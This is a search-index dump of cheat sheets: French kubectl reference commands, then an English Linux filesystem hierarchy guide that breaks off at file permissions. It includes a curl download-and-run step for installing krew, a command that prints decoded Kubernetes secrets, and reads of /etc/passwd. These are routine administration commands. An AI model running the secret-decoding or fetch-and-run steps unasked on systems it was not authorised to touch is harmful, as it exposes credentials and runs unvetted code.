namespace actuel\n</code></pre>"},{"location":"cheat-sheet/kubectl/kubectl/#gestion-des-noeuds-et-du-cluster","title":"Gestion des Noeuds et du Cluster","text":""},{"location":"cheat-sheet/kubectl/kubectl/#informations-sur-le-cluster","title":"Informations sur le Cluster","text":"<pre><code># Informations g\u00e9n\u00e9rales\nkubectl cluster-info\nkubectl cluster-info dump\nkubectl version\n\n# Informations sur les noeuds\nkubectl get nodes\nkubectl get nodes -o wide\nkubectl describe node my-node\nkubectl top node\nkubectl top node my-node\n</code></pre>"},{"location":"cheat-sheet/kubectl/kubectl/#maintenance-des-noeuds","title":"Maintenance des Noeuds","text":"<pre><code># Marquer un noeud comme non-planifiable\nkubectl cordon my-node\n\n# Drainer un noeud (\u00e9vacuer les pods)\nkubectl drain my-node\nkubectl drain my-node --ignore-daemonsets\nkubectl drain my-node --force --delete-emptydir-data\n\n# Remarquer un noeud comme planifiable\nkubectl uncordon my-node\n\n# Ajouter des taints\nkubectl taint nodes my-node key=value:NoSchedule\nkubectl taint nodes my-node key=value:NoExecute\nkubectl taint nodes my-node dedicated=special-user:NoSchedule\n\n# Supprimer des taints\nkubectl taint nodes my-node key:NoSchedule-\nkubectl taint nodes my-node dedicated-\n\n# Voir les taints\nkubectl get nodes -o custom-columns='NODE:.metadata.name,TAINTS:.spec.taints[*].key'\n</code></pre>"},{"location":"cheat-sheet/kubectl/kubectl/#debogage-et-monitoring","title":"D\u00e9bogage et Monitoring","text":""},{"location":"cheat-sheet/kubectl/kubectl/#debogage-de-pods","title":"D\u00e9bogage de Pods","text":"<pre><code># V\u00e9rifier l'\u00e9tat des pods\nkubectl get pods\nkubectl get pods --field-selector=status.phase=Failed\nkubectl get pods --field-selector=status.phase=Pending\n\n# Diagnostiquer les probl\u00e8mes\nkubectl describe pod my-pod\nkubectl get events --sort-by=.metadata.creationTimestamp\nkubectl get events --field-selector involvedObject.name=my-pod\n\n# Logs de d\u00e9bogage\nkubectl logs my-pod --previous\nkubectl logs my-pod -c init-container\nkubectl logs -f deployment/my-deployment\nkubectl logs -l app=nginx --tail=100\n</code></pre>"},{"location":"cheat-sheet/kubectl/kubectl/#surveillance-des-ressources","title":"Surveillance des Ressources","text":"<pre><code># M\u00e9triques de ressources\nkubectl top pods\nkubectl top pods --sort-by=cpu\nkubectl top pods --sort-by=memory\nkubectl top pods -l app=nginx\n\n# M\u00e9triques par namespace\nkubectl top pods -n kube-system\nkubectl top nodes\n\n# \u00c9v\u00e9nements\nkubectl get events\nkubectl get events -w\nkubectl get events --types=Warning\n</code></pre>"},{"location":"cheat-sheet/kubectl/kubectl/#debug-de-reseau","title":"Debug de R\u00e9seau","text":"<pre><code># V\u00e9rifier les services\nkubectl get svc\nkubectl get endpoints\nkubectl describe service my-service\n\n# Tester la connectivit\u00e9\nkubectl run test-pod --image=busybox -it --rm -- nslookup my-service\nkubectl run test-pod --image=curlimages/curl -it --rm -- curl http://my-service\n\n# V\u00e9rifier les ingresses\nkubectl get ingress\nkubectl describe ingress my-ingress\n\n# V\u00e9rifier les NetworkPolicies\nkubectl get networkpolicy\nkubectl describe networkpolicy my-policy\n</code></pre>"},{"location":"cheat-sheet/kubectl/kubectl/#securite-et-rbac","title":"S\u00e9curit\u00e9 et RBAC","text":""},{"location":"cheat-sheet/kubectl/kubectl/#verification-des-permissions","title":"V\u00e9rification des Permissions","text":"<pre><code># V\u00e9rifier ses propres permissions\nkubectl auth can-i create pods\nkubectl auth can-i delete pods --namespace=production\nkubectl auth can-i \"*\" \"*\"\nkubectl auth can-i list secrets --as=system:serviceaccount:default:my-sa\n\n# Lister toutes les permissions\nkubectl auth can-i --list\nkubectl auth can-i --list --as=system:serviceaccount:default:my-sa\n\n# V\u00e9rifier les permissions d'un utilisateur\nkubectl auth can-i create pods --as=john@example.com\n</code></pre>"},{"location":"cheat-sheet/kubectl/kubectl/#gestion-rbac","title":"Gestion RBAC","text":"<pre><code># Voir les r\u00f4les et bindings\nkubectl get roles\nkubectl get rolebindings\nkubectl get clusterroles\nkubectl get clusterrolebindings\n\n# D\u00e9crire un r\u00f4le\nkubectl describe clusterrole cluster-admin\nkubectl describe role my-role -n my-namespace\n\n# Cr\u00e9er un r\u00f4le\nkubectl create role pod-reader --verb=get,list,watch --resource=pods\nkubectl create clusterrole pod-reader --verb=get,list,watch --resource=pods\n\n# Cr\u00e9er un rolebinding\nkubectl create rolebinding my-binding --role=pod-reader --user=john@example.com\nkubectl create clusterrolebinding my-cluster-binding --clusterrole=cluster-admin --user=admin@example.com\n</code></pre>"},{"location":"cheat-sheet/kubectl/kubectl/#gestion-des-secrets-et-configmaps","title":"Gestion des Secrets et ConfigMaps","text":"<pre><code># Cr\u00e9er des secrets\nkubectl create secret generic my-secret --from-literal=username=admin --from-literal=password=secret123\nkubectl create secret generic my-secret --from-file=ssh-privatekey=~/.ssh/id_rsa\nkubectl create secret tls my-tls-secret --cert=tls.crt --key=tls.key\n\n# Voir les secrets (d\u00e9cod\u00e9s)\nkubectl get secret my-secret -o go-template='{{range $k,$v := .data}}{{printf \"%s: \" $k}}{{$v|base64decode}}{{\"\\n\"}}{{end}}'\n\n# Cr\u00e9er des ConfigMaps\nkubectl create configmap my-config --from-literal=key1=value1 --from-literal=key2=value2\nkubectl create configmap my-config --from-file=config.properties\nkubectl create configmap my-config --from-file=configs/\n\n# Voir les ConfigMaps\nkubectl get configmap my-config -o yaml\n</code></pre>"},{"location":"cheat-sheet/kubectl/kubectl/#filtrage-et-recherche-avancee","title":"Filtrage et Recherche Avanc\u00e9e","text":""},{"location":"cheat-sheet/kubectl/kubectl/#selecteurs-de-labels","title":"S\u00e9lecteurs de Labels","text":"<pre><code># S\u00e9lection basique\nkubectl get pods -l app=nginx\nkubectl get pods -l app=nginx,version=v1\nkubectl get pods -l 'app in (nginx,apache)'\nkubectl get pods -l 'environment notin (production)'\n\n# Op\u00e9rateurs\nkubectl get pods -l app!=nginx\nkubectl get pods -l version\nkubectl get pods -l '!version'\n\n# S\u00e9lecteurs complexes\nkubectl get pods -l 'app=nginx,environment in (dev,test),version!=v1'\n</code></pre>"},{"location":"cheat-sheet/kubectl/kubectl/#field-selectors","title":"Field Selectors","text":"<pre><code># S\u00e9lection par champs\nkubectl get pods --field-selector=status.phase=Running\nkubectl get pods --field-selector=spec.nodeName=my-node\nkubectl get services --field-selector=metadata.namespace=default\nkubectl get events --field-selector=involvedObject.kind=Pod\n\n# Combinaisons\nkubectl get pods --field-selector=status.phase=Running,spec.nodeName=my-node\n</code></pre>"},{"location":"cheat-sheet/kubectl/kubectl/#jsonpath-et-expressions","title":"JSONPath et Expressions","text":"<pre><code># Extraire des valeurs sp\u00e9cifiques\nkubectl get pods -o jsonpath='{.items[*].metadata.name}'\nkubectl get pods -o jsonpath='{.items[*].status.podIP}'\nkubectl get nodes -o jsonpath='{.items[*].status.addresses[?(@.type==\"ExternalIP\")].address}'\n\n# Templates complexes\nkubectl get pods -o custom-columns='NAME:.metadata.name,IMAGE:.spec.containers[*].image,NODE:.spec.nodeName'\n\n# Conditions\nkubectl get pods -o jsonpath='{.items[?(@.status.phase==\"Running\")].metadata.name}'\n</code></pre>"},{"location":"cheat-sheet/kubectl/kubectl/#exemples-pratiques-complets","title":"Exemples Pratiques Complets","text":""},{"location":"cheat-sheet/kubectl/kubectl/#deploiement-dune-application-complete","title":"D\u00e9ploiement d'une Application Compl\u00e8te","text":"<pre><code># 1. Cr\u00e9er un namespace\nkubectl create namespace my-app\n\n# 2. Cr\u00e9er un secret pour la base de donn\u00e9es\nkubectl create secret generic db-secret \\\n  --from-literal=username=dbuser \\\n  --from-literal=password=dbpass123 \\\n  -n my-app\n\n# 3. Cr\u00e9er une ConfigMap\nkubectl create configmap app-config \\\n  --from-literal=database_url=postgresql://db:5432/myapp \\\n  --from-literal=debug=true \\\n  -n my-app\n\n# 4. D\u00e9ployer l'application\nkubectl apply -f - &lt;&lt;EOF\napiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: web-app\n  namespace: my-app\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: web-app\n  template:\n    metadata:\n      labels:\n        app: web-app\n    spec:\n      containers:\n      - name: web\n        image: nginx:1.21\n        ports:\n        - containerPort: 80\n        env:\n        - name: DB_USERNAME\n          valueFrom:\n            secretKeyRef:\n              name: db-secret\n              key: username\n        - name: DATABASE_URL\n          valueFrom:\n            configMapKeyRef:\n              name: app-config\n              key: database_url\nEOF\n\n# 5. Cr\u00e9er un service\nkubectl expose deployment web-app --port=80 --target-port=80 -n my-app\n\n# 6. V\u00e9rifier le d\u00e9ploiement\nkubectl get all -n my-app\nkubectl rollout status deployment/web-app -n my-app\n</code></pre>"},{"location":"cheat-sheet/kubectl/kubectl/#debogage-dune-application-qui-ne-fonctionne-pas","title":"D\u00e9bogage d'une Application qui Ne Fonctionne Pas","text":"<pre><code># 1. V\u00e9rifier l'\u00e9tat g\u00e9n\u00e9ral\nkubectl get pods -n my-app\nkubectl get events -n my-app --sort-by=.metadata.creationTimestamp\n\n# 2. Inspecter le pod probl\u00e9matique\nPOD_NAME=$(kubectl get pods -n my-app -l app=web-app -o jsonpath='{.items[0].metadata.name}')\nkubectl describe pod $POD_NAME -n my-app\n\n# 3. V\u00e9rifier les logs\nkubectl logs $POD_NAME -n my-app\nkubectl logs $POD_NAME -n my-app --previous\n\n# 4. Tester la connectivit\u00e9\nkubectl run debug --image=busybox -it --rm -n my-app -- nslookup web-app\nkubectl run debug --image=curlimages/curl -it --rm -n my-app -- curl http://web-app\n\n# 5. V\u00e9rifier les ressources\nkubectl top pods -n my-app\nkubectl describe node $(kubectl get pod $POD_NAME -n my-app -o jsonpath='{.spec.nodeName}')\n</code></pre>"},{"location":"cheat-sheet/kubectl/kubectl/#migration-et-sauvegarde","title":"Migration et Sauvegarde","text":"<pre><code># Sauvegarder toutes les ressources d'un namespace\nkubectl get all -o yaml -n my-app &gt; backup-my-app.yaml\n\n# Sauvegarder des ressources sp\u00e9cifiques\nkubectl get configmaps,secrets -o yaml -n my-app &gt; config-backup.yaml\n\n# Exporter pour migration (sans statut)\nkubectl get deployment web-app -n my-app -o yaml --export &gt; web-app-deployment.yaml\n\n# Restaurer depuis la sauvegarde\nkubectl apply -f backup-my-app.yaml\n</code></pre>"},{"location":"cheat-sheet/kubectl/kubectl/#options-de-sortie-et-formatage","title":"Options de Sortie et Formatage","text":""},{"location":"cheat-sheet/kubectl/kubectl/#formats-de-sortie","title":"Formats de Sortie","text":"<pre><code># YAML\nkubectl get pod my-pod -o yaml\n\n# JSON\nkubectl get pod my-pod -o json\n\n# Large (avec plus d'informations)\nkubectl get pods -o wide\n\n# Noms seulement\nkubectl get pods -o name\n\n# Templates personnalis\u00e9s\nkubectl get pods -o custom-columns='NAME:.metadata.name,STATUS:.status.phase,NODE:.spec.nodeName'\n\n# Go templates\nkubectl get pods -o go-template='{{range .items}}{{.metadata.name}}{{\"\\n\"}}{{end}}'\n</code></pre>"},{"location":"cheat-sheet/kubectl/kubectl/#verbosite-et-debug","title":"Verbosit\u00e9 et Debug","text":"<pre><code># Niveaux de verbosit\u00e9\nkubectl get pods -v=0    # Sortie normale\nkubectl get pods -v=1    # Informations de base\nkubectl get pods -v=2    # Informations d\u00e9taill\u00e9es\nkubectl get pods -v=6    # Affiche les requ\u00eates HTTP\nkubectl get pods -v=7    # Affiche les headers HTTP\nkubectl get pods -v=8    # Affiche le contenu des requ\u00eates\nkubectl get pods -v=9    # Affiche le contenu complet\n</code></pre>"},{"location":"cheat-sheet/kubectl/kubectl/#plugins-et-extensions","title":"Plugins et Extensions","text":""},{"location":"cheat-sheet/kubectl/kubectl/#installation-de-plugins","title":"Installation de Plugins","text":"<pre><code># Installer krew (gestionnaire de plugins)\n(\n  set -x; cd \"$(mktemp -d)\" &amp;&amp;\n  OS=\"$(uname | tr '[:upper:]' '[:lower:]')\" &amp;&amp;\n  ARCH=\"$(uname -m | sed -e 's/x86_64/amd64/' -e 's/\\(arm\\)\\(64\\)\\?.*/\\1\\2/' -e 's/aarch64$/arm64/')\" &amp;&amp;\n  KREW=\"krew-${OS}_${ARCH}\" &amp;&amp;\n  curl -fsSLO \"https://github.com/kubernetes-sigs/krew/releases/latest/download/${KREW}.tar.gz\" &amp;&amp;\n  tar zxvf \"${KREW}.tar.gz\" &amp;&amp;\n  ./\"${KREW}\" install krew\n)\n\n# Ajouter krew au PATH\nexport PATH=\"${KREW_ROOT:-$HOME/.krew}/bin:$PATH\"\n\n# Installer des plugins utiles\nkubectl krew install ctx        # Changer de contexte rapidement\nkubectl krew install ns         # Changer de namespace rapidement\nkubectl krew install tree       # Voir l'arborescence des ressources\nkubectl krew install top        # M\u00e9triques avanc\u00e9es\n</code></pre>"},{"location":"cheat-sheet/kubectl/kubectl/#plugins-utiles","title":"Plugins Utiles","text":"<pre><code># kubectx et kubens (si install\u00e9s)\nkubectx                     # Lister les contextes\nkubectx my-context          # Changer de contexte\nkubens                      # Lister les namespaces\nkubens my-namespace         # Changer de namespace\n\n# Avec les plugins krew\nkubectl ctx                 # \u00c9quivalent \u00e0 kubectx\nkubectl ns                  # \u00c9quivalent \u00e0 kubens\nkubectl tree deployment my-deployment  # Voir l'arborescence\n</code></pre>"},{"location":"cheat-sheet/kubectl/kubectl/#automatisation-et-scripts","title":"Automatisation et Scripts","text":""},{"location":"cheat-sheet/kubectl/kubectl/#scripts-utiles","title":"Scripts Utiles","text":"<pre><code>#!/bin/bash\n# Script pour surveiller les pods en erreur\nwatch_failed_pods() {\n    while true; do\n        echo \"=== Failed Pods - $(date) ===\"\n        kubectl get pods --all-namespaces --field-selector=status.phase=Failed\n        echo\n        sleep 30\n    done\n}\n\n# Fonction pour nettoyer les pods termin\u00e9s\ncleanup_completed_pods() {\n    kubectl get pods --all-namespaces --field-selector=status.phase=Succeeded -o name | xargs -r kubectl delete\n}\n\n# Obtenir les pods consommant le plus de CPU\ntop_cpu_pods() {\n    kubectl top pods --all-namespaces --sort-by=cpu | head -20\n}\n\n# Obtenir les images utilis\u00e9es dans le cluster\nget_all_images() {\n    kubectl get pods --all-namespaces -o jsonpath='{.items[*].spec.containers[*].image}' | tr ' ' '\\n' | sort -u\n}\n</code></pre>"},{"location":"cheat-sheet/kubectl/kubectl/#alias-pratiques","title":"Alias Pratiques","text":"<pre><code># Alias de base\nalias k='kubectl'\nalias kgp='kubectl get pods'\nalias kgs='kubectl get services'\nalias kgd='kubectl get deployments'\nalias kdp='kubectl describe pod'\nalias kds='kubectl describe service'\nalias kdd='kubectl describe deployment'\nalias kaf='kubectl apply -f'\nalias kdel='kubectl delete'\nalias kex='kubectl exec -it'\nalias klog='kubectl logs -f'\n\n# Alias avanc\u00e9s\nalias kgpall='kubectl get pods --all-namespaces'\nalias kgpw='kubectl get pods -w'\nalias kgsw='kubectl get services -w'\nalias ktop='kubectl top'\nalias kctx='kubectl config current-context'\nalias kns='kubectl config view --minify --output \"jsonpath={..namespace}\"'\n\n# Fonction pour pods par node\npods_by_node() {\n    kubectl get pods --all-namespaces -o wide --field-selector spec.nodeName=$1\n}\n</code></pre>"},{"location":"cheat-sheet/kubectl/kubectl/#troubleshooting-courant","title":"Troubleshooting Courant","text":""},{"location":"cheat-sheet/kubectl/kubectl/#problemes-frequents-et-solutions","title":"Probl\u00e8mes Fr\u00e9quents et Solutions","text":"<pre><code># 1. Pod en \u00e9tat Pending\nkubectl describe pod &lt;pod-name&gt;\n# Chercher : Insufficient resources, taints, node selectors\n\n# 2. Pod en CrashLoopBackOff\nkubectl logs &lt;pod-name&gt; --previous\nkubectl describe pod &lt;pod-name&gt;\n# V\u00e9rifier : liveness probe, resources, permissions\n\n# 3. Service inaccessible\nkubectl get endpoints &lt;service-name&gt;\nkubectl describe service &lt;service-name&gt;\n# V\u00e9rifier : selector labels, target port\n\n# 4. Probl\u00e8mes de r\u00e9seau\nkubectl run test-pod --image=busybox -it --rm -- nslookup kubernetes.default\nkubectl run test-pod --image=busybox -it --rm -- ping &lt;pod-ip&gt;\n\n# 5. Permissions RBAC\nkubectl auth can-i &lt;verb&gt; &lt;resource&gt; --as=&lt;user&gt;\nkubectl get rolebindings,clusterrolebindings --all-namespaces | grep &lt;user&gt;\n\n# 6. Ressources insuffisantes\nkubectl top nodes\nkubectl describe node &lt;node-name&gt;\nkubectl get events --sort-by=.metadata.creationTimestamp\n</code></pre>"},{"location":"cheat-sheet/kubectl/kubectl/#commandes-de-debug-durgence","title":"Commandes de Debug d'Urgence","text":"<pre><code># Pods en erreur\nkubectl get pods --all-namespaces --field-selector=status.phase!=Running,status.phase!=Succeeded\n\n# \u00c9v\u00e9nements r\u00e9cents\nkubectl get events --sort-by=.metadata.creationTimestamp --all-namespaces | tail -20\n\n# Noeuds en probl\u00e8me\nkubectl get nodes --no-headers | awk '$2 != \"Ready\" { print $1 }'\n\n# Ressources consommant le plus\nkubectl top pods --all-namespaces --sort-by=cpu | head -10\nkubectl top pods --all-namespaces --sort-by=memory | head -10\n\n# Services sans endpoints\nkubectl get endpoints --all-namespaces | awk 'NF==2 &amp;&amp; $2==\"\" { print $1 }'\n</code></pre>"},{"location":"cheat-sheet/kubectl/kubectl/#ressources-et-documentation","title":"Ressources et Documentation","text":""},{"location":"cheat-sheet/kubectl/kubectl/#liens-utiles","title":"Liens Utiles","text":"<ul> <li>Documentation officielle : https://kubernetes.io/docs/reference/kubectl/</li> <li>Cheat Sheet officiel : https://kubernetes.io/docs/reference/kubectl/cheatsheet/</li> <li>Reference API : https://kubernetes.io/docs/reference/generated/kubectl/kubectl-commands</li> <li>JSONPath Guide : https://kubernetes.io/docs/reference/kubectl/jsonpath/</li> <li>Krew Plugin Manager : https://krew.sigs.k8s.io/</li> </ul>"},{"location":"cheat-sheet/kubectl/kubectl/#types-de-ressources-kubernetes","title":"Types de Ressources Kubernetes","text":"<pre><code># Voir tous les types de ressources disponibles\nkubectl api-resources\n\n# Ressources par groupe d'API\nkubectl api-resources --api-group=apps\nkubectl api-resources --namespaced=true\nkubectl api-resources --namespaced=false\n\n# Versions d'API\nkubectl api-versions\n</code></pre> <p>Cette documentation kubectl couvre les commandes essentielles et avanc\u00e9es pour g\u00e9rer efficacement vos clusters Kubernetes. Ma\u00eetriser ces commandes vous permettra d'\u00eatre plus productif dans vos t\u00e2ches quotidiennes d'administration Kubernetes.</p>"},{"location":"cheat-sheet/linux-filesystem/linux-filesystem/","title":"Linux Filesystem Cheat Sheet","text":""},{"location":"cheat-sheet/linux-filesystem/linux-filesystem/#overview","title":"Overview","text":"<p>The Linux filesystem follows the Filesystem Hierarchy Standard (FHS), which defines the directory structure and contents in Unix-like operating systems.</p> <p>Key Principles: - Everything is a file (including devices) - Single root directory (/) - Case-sensitive filenames - Hidden files start with dot (.) - No file extensions required</p>"},{"location":"cheat-sheet/linux-filesystem/linux-filesystem/#filesystem-hierarchy-standard-fhs","title":"Filesystem Hierarchy Standard (FHS)","text":""},{"location":"cheat-sheet/linux-filesystem/linux-filesystem/#root-directory","title":"Root Directory (/)","text":"<p>The top-level directory from which all other directories branch.</p> <pre><code>/\n\u251c\u2500\u2500 bin     -&gt; usr/bin    # Essential user binaries\n\u251c\u2500\u2500 boot                  # Boot loader files\n\u251c\u2500\u2500 dev                   # Device files\n\u251c\u2500\u2500 etc                   # System configuration files\n\u251c\u2500\u2500 home                  # User home directories\n\u251c\u2500\u2500 lib     -&gt; usr/lib    # Shared libraries\n\u251c\u2500\u2500 media                 # Mount points for removable media\n\u251c\u2500\u2500 mnt                   # Temporary mount points\n\u251c\u2500\u2500 opt                   # Optional/third-party software\n\u251c\u2500\u2500 proc                  # Process and kernel information\n\u251c\u2500\u2500 root                  # Root user home directory\n\u251c\u2500\u2500 run                   # Runtime data\n\u251c\u2500\u2500 sbin    -&gt; usr/sbin   # System binaries\n\u251c\u2500\u2500 srv                   # Service data\n\u251c\u2500\u2500 sys                   # Kernel and system information\n\u251c\u2500\u2500 tmp                   # Temporary files\n\u251c\u2500\u2500 usr                   # User programs and data\n\u2514\u2500\u2500 var                   # Variable data files\n</code></pre>"},{"location":"cheat-sheet/linux-filesystem/linux-filesystem/#bin-essential-user-binaries","title":"/bin - Essential User Binaries","text":"<pre><code># Symlinked to /usr/bin on modern systems\nls /bin\n# Common binaries: bash, cat, cp, ls, mv, rm, echo, grep, etc.\n</code></pre>"},{"location":"cheat-sheet/linux-filesystem/linux-filesystem/#boot-boot-loader-files","title":"/boot - Boot Loader Files","text":"<pre><code>/boot/\n\u251c\u2500\u2500 vmlinuz-*          # Linux kernel\n\u251c\u2500\u2500 initrd.img-*       # Initial RAM disk\n\u251c\u2500\u2500 grub/              # GRUB bootloader\n\u2514\u2500\u2500 config-*           # Kernel configuration\n</code></pre>"},{"location":"cheat-sheet/linux-filesystem/linux-filesystem/#dev-device-files","title":"/dev - Device Files","text":"<pre><code>/dev/\n\u251c\u2500\u2500 sda, sdb           # SATA/SCSI disks\n\u251c\u2500\u2500 sda1, sda2         # Disk partitions\n\u251c\u2500\u2500 nvme0n1            # NVMe drives\n\u251c\u2500\u2500 tty*               # Terminals\n\u251c\u2500\u2500 null               # Null device (discards all data)\n\u251c\u2500\u2500 zero               # Zero device (provides zeros)\n\u251c\u2500\u2500 random, urandom    # Random number generators\n\u2514\u2500\u2500 loop*              # Loop devices\n\n# Examples\nls -l /dev/sda         # View disk device\nls -l /dev/tty1        # View terminal device\n</code></pre>"},{"location":"cheat-sheet/linux-filesystem/linux-filesystem/#etc-system-configuration","title":"/etc - System Configuration","text":"<pre><code>/etc/\n\u251c\u2500\u2500 passwd             # User account information\n\u251c\u2500\u2500 shadow             # Encrypted passwords\n\u251c\u2500\u2500 group              # Group information\n\u251c\u2500\u2500 fstab              # Filesystem mount table\n\u251c\u2500\u2500 hosts              # Static hostname lookup\n\u251c\u2500\u2500 hostname           # System hostname\n\u251c\u2500\u2500 resolv.conf        # DNS resolver configuration\n\u251c\u2500\u2500 network/           # Network configuration\n\u251c\u2500\u2500 ssh/               # SSH configuration\n\u251c\u2500\u2500 systemd/           # Systemd configuration\n\u251c\u2500\u2500 apt/               # APT configuration (Debian/Ubuntu)\n\u251c\u2500\u2500 yum/               # YUM configuration (RHEL/CentOS)\n\u2514\u2500\u2500 cron.d/            # Cron job configurations\n\n# Examples\ncat /etc/passwd        # View user accounts\ncat /etc/hosts         # View hostname mappings\ncat /etc/fstab         # View filesystem mounts\n</code></pre>"},{"location":"cheat-sheet/linux-filesystem/linux-filesystem/#home-user-home-directories","title":"/home - User Home Directories","text":"<pre><code>/home/\n\u251c\u2500\u2500 user1/\n\u2502   \u251c\u2500\u2500 .bashrc        # Bash configuration\n\u2502   \u251c\u2500\u2500 .profile       # Shell profile\n\u2502   \u251c\u2500\u2500 .ssh/          # SSH keys\n\u2502   \u251c\u2500\u2500 Documents/\n\u2502   \u251c\u2500\u2500 Downloads/\n\u2502   \u2514\u2500\u2500 .local/        # User-specific data\n\u2514\u2500\u2500 user2/\n\n# User home directory shortcut\necho $HOME             # /home/username\ncd ~                   # Go to home directory\ncd ~/Documents         # Go to Documents\n</code></pre>"},{"location":"cheat-sheet/linux-filesystem/linux-filesystem/#lib-shared-libraries","title":"/lib - Shared Libraries","text":"<pre><code># Symlinked to /usr/lib on modern systems\n/lib/\n\u251c\u2500\u2500 modules/           # Kernel modules\n\u251c\u2500\u2500 firmware/          # Hardware firmware\n\u2514\u2500\u2500 *.so               # Shared library files\n\n# Examples\nls /lib/modules/$(uname -r)/  # Current kernel modules\n</code></pre>"},{"location":"cheat-sheet/linux-filesystem/linux-filesystem/#media-removable-media","title":"/media - Removable Media","text":"<pre><code>/media/\n\u251c\u2500\u2500 username/\n\u2502   \u251c\u2500\u2500 USB_DRIVE/\n\u2502   \u2514\u2500\u2500 CDROM/\n\n# Auto-mounted removable devices\n</code></pre>"},{"location":"cheat-sheet/linux-filesystem/linux-filesystem/#mnt-temporary-mounts","title":"/mnt - Temporary Mounts","text":"<pre><code># Manual mount point for temporary filesystems\nsudo mount /dev/sdb1 /mnt\nsudo umount /mnt\n</code></pre>"},{"location":"cheat-sheet/linux-filesystem/linux-filesystem/#opt-optional-software","title":"/opt - Optional Software","text":"<pre><code>/opt/\n\u251c\u2500\u2500 google/            # Google Chrome\n\u251c\u2500\u2500 teamviewer/\n\u2514\u2500\u2500 custom-app/\n\n# Third-party applications that don't follow FHS\n</code></pre>"},{"location":"cheat-sheet/linux-filesystem/linux-filesystem/#proc-process-information","title":"/proc - Process Information","text":"<pre><code>/proc/\n\u251c\u2500\u2500 1234/              # Process ID directory\n\u251c\u2500\u2500 cpuinfo            # CPU information\n\u251c\u2500\u2500 meminfo            # Memory information\n\u251c\u2500\u2500 version            # Kernel version\n\u2514\u2500\u2500 uptime             # System uptime\n\n# Examples\ncat /proc/cpuinfo      # View CPU info\ncat /proc/meminfo      # View memory info\ncat /proc/version      # View kernel version\nls /proc/1/            # View init process info\n</code></pre>"},{"location":"cheat-sheet/linux-filesystem/linux-filesystem/#root-root-home-directory","title":"/root - Root Home Directory","text":"<pre><code># Home directory for root user\n/root/\n\u251c\u2500\u2500 .bashrc\n\u251c\u2500\u2500 .ssh/\n\u2514\u2500\u2500 scripts/\n\n# Access\nsudo -i                # Switch to root\n</code></pre>"},{"location":"cheat-sheet/linux-filesystem/linux-filesystem/#run-runtime-data","title":"/run - Runtime Data","text":"<pre><code>/run/\n\u251c\u2500\u2500 systemd/           # Systemd runtime data\n\u251c\u2500\u2500 user/              # User runtime directories\n\u2514\u2500\u2500 lock/              # Lock files\n\n# Cleared on reboot\n</code></pre>"},{"location":"cheat-sheet/linux-filesystem/linux-filesystem/#srv-service-data","title":"/srv - Service Data","text":"<pre><code>/srv/\n\u251c\u2500\u2500 www/               # Web server data\n\u251c\u2500\u2500 ftp/               # FTP server data\n\u2514\u2500\u2500 git/               # Git repositories\n\n# Data for services provided by the system\n</code></pre>"},{"location":"cheat-sheet/linux-filesystem/linux-filesystem/#sys-kernelhardware-info","title":"/sys - Kernel/Hardware Info","text":"<pre><code>/sys/\n\u251c\u2500\u2500 block/             # Block devices\n\u251c\u2500\u2500 bus/               # Bus types\n\u251c\u2500\u2500 class/             # Device classes\n\u251c\u2500\u2500 devices/           # Physical devices\n\u2514\u2500\u2500 module/            # Kernel modules\n\n# Examples\ncat /sys/class/power_supply/BAT0/capacity  # Battery level\ncat /sys/class/thermal/thermal_zone0/temp   # CPU temperature\n</code></pre>"},{"location":"cheat-sheet/linux-filesystem/linux-filesystem/#tmp-temporary-files","title":"/tmp - Temporary Files","text":"<pre><code>/tmp/\n# Cleared periodically (usually on reboot)\n# World-writable with sticky bit\n\n# Create temp file\nmktemp /tmp/myfile.XXXXXX\n\n# Permissions\nls -ld /tmp\n# drwxrwxrwt (sticky bit set)\n</code></pre>"},{"location":"cheat-sheet/linux-filesystem/linux-filesystem/#usr-user-programs","title":"/usr - User Programs","text":"<pre><code>/usr/\n\u251c\u2500\u2500 bin/               # User commands\n\u251c\u2500\u2500 sbin/              # System administration commands\n\u251c\u2500\u2500 lib/               # Libraries\n\u251c\u2500\u2500 share/             # Architecture-independent data\n\u2502   \u251c\u2500\u2500 man/           # Manual pages\n\u2502   \u251c\u2500\u2500 doc/           # Documentation\n\u2502   \u2514\u2500\u2500 applications/  # Desktop entries\n\u251c\u2500\u2500 local/             # Locally installed software\n\u2502   \u251c\u2500\u2500 bin/\n\u2502   \u251c\u2500\u2500 lib/\n\u2502   \u2514\u2500\u2500 share/\n\u251c\u2500\u2500 include/           # C header files\n\u2514\u2500\u2500 src/               # Source code\n\n# Examples\nls /usr/bin            # User binaries\nman -k keyword         # Search man pages\n</code></pre>"},{"location":"cheat-sheet/linux-filesystem/linux-filesystem/#var-variable-data","title":"/var - Variable Data","text":"<pre><code>/var/\n\u251c\u2500\u2500 log/               # Log files\n\u2502   \u251c\u2500\u2500 syslog         # System log\n\u2502   \u251c\u2500\u2500 auth.log       # Authentication log\n\u2502   \u251c\u2500\u2500 kern.log       # Kernel log\n\u2502   \u2514\u2500\u2500 apache2/       # Apache logs\n\u251c\u2500\u2500 cache/             # Application cache\n\u251c\u2500\u2500 tmp/               # Temporary files (preserved across reboots)\n\u251c\u2500\u2500 spool/             # Spool files\n\u2502   \u251c\u2500\u2500 cron/          # Cron jobs\n\u2502   \u2514\u2500\u2500 mail/          # Mail queue\n\u251c\u2500\u2500 lib/               # Variable state information\n\u2502   \u251c\u2500\u2500 dpkg/          # Package manager database\n\u2502   \u2514\u2500\u2500 mysql/         # MySQL databases\n\u251c\u2500\u2500 www/               # Web server files\n\u2514\u2500\u2500 run/               # Runtime data (symlink to /run)\n\n# Examples\ntail -f /var/log/syslog          # Monitor system log\nls /var/cache/apt/archives/      # APT package cache\n</code></pre>"},{"location":"cheat-sheet/linux-filesystem/linux-filesystem/#file-permissions","title":"File Permissions","text":""},{"location":"cheat-sheet/linux-filesystem/linux-filesystem/#permission-types","title":"Permission Types","text":"<pre><code># Format: type|owner|group|others\n# drwxr-xr-x\n# d = directory\n# rwx = read, write, execute for owner\n# r-x = read, execute for group\n# r-x = read, execute for others\n\n# Permission values\nr (read)    = 4\nw (write)   = 2\nx (execute) = 1\n- (none)    = 0\n</code></pre>"},{"location":"cheat-sheet/linux-filesystem/linux-filesystem/#viewing-permissions","title":"Viewing Permissions","text":"<pre><code># Long listing\nls -l file.txt\n# -rw-r--r-- 1 user group 1234 Jan 15 10:00 file.txt\n\n# Just permissions\nstat -c '%A' file.txt\n# -rw-r--r--\n\n# Numeric permissions\nstat -c '%a' file.txt\n# 644\n</code></pre>"},{"location":"cheat-sheet/linux-filesystem/linux-filesystem/#chmod-change-mode","title":"chmod - Change 